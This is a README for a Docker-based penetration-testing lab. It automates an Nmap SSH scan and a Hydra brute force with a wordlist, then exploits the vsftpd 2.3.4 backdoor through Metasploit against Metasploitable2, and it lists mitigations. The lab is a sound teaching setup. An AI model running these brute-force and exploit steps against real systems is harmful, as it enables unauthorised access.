# 🔐 SSH Brute-Force & Metasploit Automation Lab (BootCon Project)

This project demonstrates real-world penetration testing techniques using automated Python scripting, Kali tools, and Dockerized lab environments. It’s built entirely with Ansible and Python for fast setup and teardown, ideal for live demonstrations or self-paced labs.

---

## 🧠 Project Objectives

1. **Automated Brute-Force Attack**  
   Develop a Python script to:
   - Scan SSH ports using Nmap
   - Brute-force login using Hydra against a vulnerable container

2. **Exploit Vulnerabilities with Metasploit**  
   Use `msfconsole` inside a Kali container to:
   - Target known services (like vsftpd or phpMyAdmin) inside a Metasploitable2 container
   - Gain shell access for post-exploitation

---

## 🧰 Tools & Technologies

- Python 3
- Docker (Mac with Colima)
- Ansible
- Kali Linux (Docker)
- Ubuntu + OpenSSH server (Docker)
- Metasploitable2 (Docker)
- Hydra
- Nmap
- Metasploit Framework

---

## 🏗️ Folder Structure

ssh-brute-lab/ ├── ansible/ │ ├── setup-kali.yml │ ├── setup-target.yml │ ├── setup-metasploit.yml │ └── lab-cleanup.yml ├── scripts/ │ └── ssh_bruteforce.py ├── README.md ├── .gitignore



---

## 🚀 Setup & Usage

### ✅ 1. Ensure Docker + Colima Is Running
```bash
colima start
docker context use colima
```

### 2. Set Up the Lab (via Ansible) ###
```bash
cd ansible
ansible-playbook setup-target.yml
ansible-playbook setup-kali.yml
ansible-playbook setup-metasploit.yml
```

### 3. Run Brute-Force Automation ###
docker cp scripts/ssh_bruteforce.py kali_attacker:/root/
docker exec -it kali_attacker python3 /root/ssh_bruteforce.py

```
This will:

Scan SSH port on the Ubuntu container (host.docker.internal:2222)

Attempt to brute-force using rockyou.txt
```

### 4. Metasploit Exploitation ###
Enter Kali and launch msfconsole:
`docker exec -it kali_attacker msfconsole`

Example 1 – Exploiting vsftpd Backdoor:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST host.docker.internal
set RPORT 21
run
```

🧪 Demonstration Checklist
✅ Show nmap port scan
✅ Show Hydra crack login using toor password
✅ Run msfconsole exploit to get shell
✅ Summarize findings and highlight mitigations


### Mitigation Techniques ###
```
Disable SSH root login
Use key-based authentication
Use tools like fail2ban
Patch known services
Restrict Docker networks or isolate attack surfaces
```

🧹 Cleanup
```bash
ansible-playbook ansible/lab-cleanup.yml
```
